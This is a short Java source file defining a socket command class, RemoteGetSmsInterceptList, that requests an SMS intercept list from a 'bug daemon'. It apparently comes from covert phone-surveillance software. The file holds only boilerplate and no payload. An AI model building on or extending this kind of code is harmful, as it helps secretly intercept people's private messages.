package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.SmsInterceptList;

public class RemoteGetSmsInterceptList extends SocketCmd<String, SmsInterceptList>{

	private static final long serialVersionUID = 9196497582127777767L;
	
	private static final String TAG = "RemoteGetSmsInterceptList";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteGetSmsInterceptList(String ownerPackage) {
		super(ownerPackage, SmsInterceptList.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
